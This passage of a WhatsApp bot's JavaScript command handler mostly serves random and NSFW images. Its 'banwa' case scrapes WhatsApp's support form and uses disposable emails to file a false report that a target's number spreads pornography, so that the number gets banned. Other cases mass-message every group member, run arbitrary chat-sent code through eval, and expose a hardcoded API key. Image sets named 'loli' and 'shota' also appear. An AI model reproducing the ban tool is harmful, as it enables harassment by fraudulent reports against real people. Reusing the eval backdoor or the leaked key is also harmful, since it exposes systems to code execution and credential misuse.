DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
replygcdeepak(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'lizard':
case 'meow':
case 'tickle':
replygcdeepak(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
            await DeepakBotInc.sendMessage(m.chat,{ caption: mess.success, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewallpaper2': case 'animewall2': {
                if (!args.join(" ")) return replygcdeepak("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
                DeepakBotInc.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replygcdeepak('What wallpaper do you want?')
replygcdeepak(mess.wait)
const wall = new AnimeWallpaper();
    const pages = [1,2,3,4];
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null);
const i = Math.floor(Math.random() * wallpaper.length);     
            await DeepakBotInc.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                    return('Error!')
                })
//DeepakBotInc.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPrem) return replyprem(mess.premium)
replygcdeepak(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
DeepakBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case '>':
case '=>':
if (!DeepakTheCreator) return;
var err = new TypeError;
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replygcdeepak(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replygcdeepak(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replygcdeepak(util.format(_syntax + _err))
}
break;
        case 'banwa': {

if (!DeepakTheCreator) return 

if (!text) return replygcdeepak(`Where's the number?`)

let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")

let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")

let cookie = ntah.headers["set-cookie"].join("; ")

let $ = cheerio.load(ntah.data)

let $form = $("form");

let url = new URL($form.attr("action"), "https://www.whatsapp.com").href

let form = new URLSearchParams()

form.append("jazoest", $form.find("input[name=jazoest]").val())

form.append("lsd", $form.find("input[name=lsd]").val())

form.append("step", "submit")

form.append("country_selector", "ID")

form.append("phone_number", text)

form.append("email", email.data[0])

form.append("email_confirm", email.data[0])

form.append("platform", "ANDROID")

form.append("your_message", `Hello Dear WhatsApp

Good morning/afternoon/night

My WhatsApp Number ${text} Stolen And Now Used to spread pornography and illegal sales, please take immediate action regarding my account.

If you can, just disable it

for important chat matters I don't have it

Thank you`)

form.append("__user", "0")

form.append("__a", "1")

form.append("__csr", "")

form.append("__req", "8")

form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")

form.append("dpr", "1")

form.append("__ccg", "UNKNOWN")

form.append("__rev", "1006630858")

form.append("__comment_req", "0")

let res = await axios({

  url,

  method: "POST",

  data: form,

  headers: {

    cookie

  }

})

replygcdeepak(util.format(JSON.parse(res.data.replace("for (;;);", ""))))

}

break
case 'pushcontact': {
    if (!DeepakTheCreator) return replygcdeepak(mess.owner)
      if (!m.isGroup) return replygcdeepak(`The feature works only in grup`)
    if (!text) return replygcdeepak(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcdeepak(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    DeepakBotInc.sendMessage(pler, { text: q})
     }  
     replygcdeepak(`Done`)
      }
      break
            case 'id':{
            replygcdeepak(from)
           }
          break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replygcdeepak(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replygcdeepak(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await DeepakBotInc.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	case 'hentaivid2': {
if (!m.isGroup) return m.reply(mess.group)
if (!isPrem) return replyprem(mess.premium)
if (!AntiNsfw) return m.reply(mess.nsfw)
replygcdeepak(mess.wait)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
DeepakBotInc.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
                m.reply(mess.wait)
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                DeepakBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return replygcdeepak(mess.group)
if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return replygcdeepak(mess.group)
if (!AntiNsfw) return replygcdeepak(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return replygcdeepak(mess.group)
if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return replygcdeepak(mess.group)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/milf.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await DeepakBotInc.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/ahegao.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/ass.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/bdsm.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/blowjob.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/cuckold.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/cum.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/eba.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/ero.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/femdom.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./ZenitsuBotMedia/nsfw/foot.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return replygcdeepak(mess.group)
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
replygcdeepak(mess.wait)
